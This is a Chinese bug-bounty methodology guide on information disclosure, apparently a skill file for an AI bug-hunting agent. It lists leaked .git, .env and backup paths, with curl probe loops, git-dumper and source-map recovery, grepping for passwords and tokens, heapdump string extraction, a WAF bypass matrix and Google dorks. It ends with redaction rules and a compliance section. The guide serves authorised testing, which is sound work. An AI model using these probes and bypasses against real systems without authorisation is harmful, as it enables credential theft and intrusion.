# 信息泄露 / 敏感文件 / 备份（Information Disclosure）

> 服务暴露了不该暴露的资产（源码、配置、密钥、凭据、PII）。这是**链路终点**——一个 `.git` 泄露能直接拿数据库密码 → 提升为 P0。WooYun 7,337 案例中 **48.7% 是敏感信息泄露**，**40% 涉及凭证/数据库**（数据来源：本地 src-hunter WooYun 案例统计，非官方数据）。`.env` / `.git` / `.svn` / `.DS_Store` / 备份文件是入口最浅、命中率最高的信息泄露点。

**取材来源**（本文件内容改编自，非整库复制）：
- [MyuriKanao/src-hunter-skill](https://github.com/MyuriKanao/src-hunter-skill)
- [elementalsouls/Claude-BugHunter](https://github.com/elementalsouls/Claude-BugHunter)
- 权威公开源：HackTricks / PayloadsAllTheThings

---

## 1. 触发信号

- 访问 `/.git/HEAD` `/.svn/entries` `/.DS_Store` `/.env` 返回 200
- 探测 `/wwwroot.zip` `/backup.sql` `/config.php.bak` `/index.php.swp` 命中
- `/phpinfo.php` `/server-status` 返回 PHP 配置 / Apache 状态页
- 目录列举：URL 末尾带 `/` 出现「Index of /」文件列表
- JS 文件 / source map 里出现 `API_KEY=` `SECRET_KEY=` `password=` `/api/internal/` 等硬编码值

## 2. 高频入口点

### 2.1 版本控制泄露（560 案例）`[本地 src-hunter]`

| 路径 | 含义 | 利用工具 |
|------|------|---------|
| `/.git/config` `/.git/HEAD` | Git 配置 / 当前分支 | git-dumper、GitHack、dvcs-ripper |
| `/.git/index` `/.git/logs/HEAD` `/.git/objects/` | 索引 / 日志 / 对象存储 | 同上 |
| `/.svn/entries` | SVN ≤1.6 入口（**393 例高频**） | svn-extractor |
| `/.svn/wc.db` | SVN 1.7+ SQLite | `sqlite3 wc.db` |
| `/.svn/all-wcprops` `/.svn/pristine/` | SVN 工作副本属性 / 原始文件 | - |
| `/.hg/` `/.bzr/` `/CVS/Entries` | Mercurial / Bazaar / CVS | dvcs-ripper |

### 2.2 备份文件（565 案例，命中率最高）`[本地 src-hunter]`

```
# 压缩包（530 例命中）
/wwwroot.rar   /wwwroot.zip   /wwwroot.tar.gz
/www.rar  /www.zip  /www.tar.gz
/web.rar  /web.zip  /web.tar.gz
/site.rar /site.zip /site.tar.gz
/backup.zip  /backup.tar.gz
/{域名}.zip  /{域名}.rar   # 例：example.com.zip
/{年份}.zip  /backup_2024.zip  /old_2023.zip

# SQL（136 例命中）
/backup.sql  /database.sql  /db.sql  /dump.sql  /data.sql

# 配置备份（101 例命中）
/config.php.bak   /config.php~   /config.php.swp
/config_global.php.bak   /web.config.bak   /.env.bak   /database.yml.bak

# 编辑器临时文件 / 系统文件
/index.php.swp   /.index.php.swp   /index.php~   /.index.php~
/.DS_Store   /Thumbs.db
```

### 2.3 配置文件明文暴露 `[本地 src-hunter]`

```
# Java/Spring
/WEB-INF/web.xml   /WEB-INF/classes/application.properties
/WEB-INF/classes/jdbc.properties   /application.yml   /application-prod.yml
# PHP
/config.php   /config/config.php   /data/config.php   /application/config/database.php
# .NET
/web.config   /App_Data/   /connectionStrings.config
# 现代框架
/.env  /.env.local  /.env.production  /.env.development  /.env.staging
/config.json  /settings.py  /appsettings.json
# 容器 / k8s
/docker-compose.yml  /Dockerfile  /.kube/config
```

### 2.4 探针文件 / 日志 / 目录列举 `[本地 src-hunter]`

```
/phpinfo.php  /info.php  /test.php  /probe.php  /debug.php
/test.jsp  /info.jsp
/server-status   /server-info    # Apache mod_status（目录列举/IP 泄露）
/jolokia/list                   # JMX
/logs/ctp.log                   # 致远 OA 高频
/debug.log  /error.log  /access.log  /application.log
/runtime/logs/   # ThinkPHP
/storage/logs/   # Laravel
```

### 2.5 JS 里的密钥 / source map `[Claude-BugHunter]`

| 目标 | 线索 |
|------|------|
| `.js.map` source map | 还原 TypeScript/ES6 源码 → 硬编码 API key、内部端点、鉴权逻辑 |
| `swagger.json` / `openapi.json` | 完整 REST 规范（所有端点/参数/鉴权方案） |
| `asset-manifest.json` / `_next/static/` | 所有 JS bundle 路径 → 系统性发现 source map |
| webpack chunk | `apiKey` / `secret` / `password` / `token` / Base64 编码密钥 |
| `build-info` / `info.json` | git commit hash、构建时间、依赖版本 → CVE 定向 |

---

## 3. 探测顺序（从最无害 → 最有杀伤力）

1. **被动收集**：Google Hacking / Github 关键字 + 前端 JS/HTML 注释/robots.txt/sitemap 找线索。
2. **一键路径探测**：`.git/config` `.svn/entries` `.env` 等 10 个快路径（<30s），命中即停。
3. **备份文件字典**：zip/rar/tar.gz/sql/bak 组合枚举（字典控制在 1000 条内）。
4. **source map 发现**：从 `asset-manifest.json` / 首页 bundle 名派生 `.map` URL，下载还原源码。
5. **提取与最小验证**：grep 凭据 → 报告「读到文件名 + sha256 指纹」即止，不连接、不导出。

## 4. Payload 区（每条标注出处）

### 4.1 基础探测 `[本地 src-hunter]`

```bash
# 版本控制
for p in .git/config .git/HEAD .svn/entries .svn/wc.db .hg/store; do
  curl -s -o /dev/null -w "%{http_code} $p\n" https://target/$p
done

# 备份文件
for ext in zip rar tar.gz sql bak; do
  for name in www web site backup wwwroot data; do
    curl -s -o /dev/null -w "%{http_code} /$name.$ext\n" https://target/$name.$ext
  done
done

# .DS_Store（macOS 部署常见）
curl -s "https://target/.DS_Store" | xxd | head -10
```

### 4.2 数据提取 / 进阶 `[本地 src-hunter + Claude-BugHunter]`

```bash
# .git 完整还原 → grep 凭据
git-dumper https://target/.git/ ./loot/
cd loot && git log --all --oneline
grep -rE "(password|secret|apikey|token|jdbc:|mysql://|redis://)" .

# source map 还原 + 找密钥（Claude-BugHunter）
HASH=$(curl -s "https://target/" | grep -oE 'main\.[a-f0-9]+\.js' | head -1)
curl -s "https://target/static/js/${HASH}.map" | python3 -c "
import sys, json, os
data = json.load(sys.stdin)
for src, content in zip(data.get('sources',[]), data.get('sourcesContent',[])):
    if content:
        p = '/tmp/sm/' + src.replace('../','').replace('./','')
        os.makedirs(os.path.dirname(p), exist_ok=True)
        open(p,'w').write(content)
"
grep -rE "API_KEY|SECRET|PASSWORD|TOKEN|process\.env\." /tmp/sm/ 2>/dev/null | head -20

# .DS_Store 解析目录结构
pip3 install ds_store
python3 ds_store_exp.py "https://target/"

# heapdump 里的密码
curl http://target/actuator/heapdump -o heap.bin
strings heap.bin | grep -iE "(password|secret|jdbc|jwt|redis|aws)" | sort -u
```

### 4.3 Bypass 矩阵 `[本地 src-hunter §4]`

| 拦截 | 绕过 |
|------|------|
| `.git` 路径被 nginx 拦 | `.GIT/` `.GiT/` `%2egit/` `/x/../.git/` `//.git/` |
| `.env` 拦 | `/static/../.env` `/uploads/.env` `/.env%20` `/.env.bak` |
| 备份后缀拦 | `.bak.bak` 用 `.swp` 而非 `.bak`、URL encode 后缀 |
| 大小写 | `/Backup.ZIP` `/Config.PHP.BAK` |
| 文件名混淆 | 时间戳：`/backup_$(date +%Y%m%d).zip` `/2024-01-15.sql` |

## 5. 工具用法

```bash
# 目录/敏感文件扫描
dirsearch -u https://target/ -e php,jsp,asp,bak,zip,rar,sql -w wordlists/sensitive.txt
ffuf -u https://target/FUZZ -w sensitive-paths.txt -mc 200,301 -fc 404
nuclei -u https://target -t exposures/

# 版本控制还原
git-dumper https://target/.git/ ./loot/
GitHack https://target/.git/
# 密钥扫描
trufflehog filesystem ./loot/

# Google Hacking
site:target.com filetype:sql
site:target.com filetype:bak
site:target.com inurl:.git
site:target.com intitle:"index of" .git
"target.com" password
"@target.com" filename:.env
```

## 6. 证据要求

**「已确认」必须满足**：目标路径返回 200 + 敏感内容（保存完整 URL、状态码、关键 Header、脱敏后的响应体片段）。

**脱敏样式**：

```
原文（不写进报告）：spring.datasource.password=Mp4ssw0rd!
报告（这样写）：    spring.datasource.password=M****d!（共 13 位）

原文：ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDxxxx... user@host
报告：ssh-rsa AAAAB3...（前 8 + 后 8 字符 + 长度）user@host
```

**CVSS 参考**：

```
.git 泄露源码         CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N = 7.5
.env 泄露 prod 凭据    CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8（依赖凭据用途）
phpinfo.php 暴露      CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N = 5.3
heapdump 含 DB 密码   = 9.8 Critical
public S3 bucket 含 PII = 7.5+
```

## 7. 合规边界 / 不要做的事

- **禁**：clone 完整源码到自己 GitHub / 公网仓库；本地保存，报告后删除。
- **禁**：用泄露的 AWS / Stripe / SendGrid / DB 凭据创建资源、发邮件、扣款、连生产库导出数据；仅做「能 telnet 通端口 + 看到 banner」的最小验证。
- **禁**：用泄露的短信 API 给真实手机号发短信。
- **禁**：在报告中粘贴完整凭据；脱敏 + 附 sha256 指纹证明拿到过。
- **禁**：source map / heapdump / 备份文件传第三方网盘。
- **限**：扫描 1–5 rps；备份字典 ≤1000 条，避免触发风控。
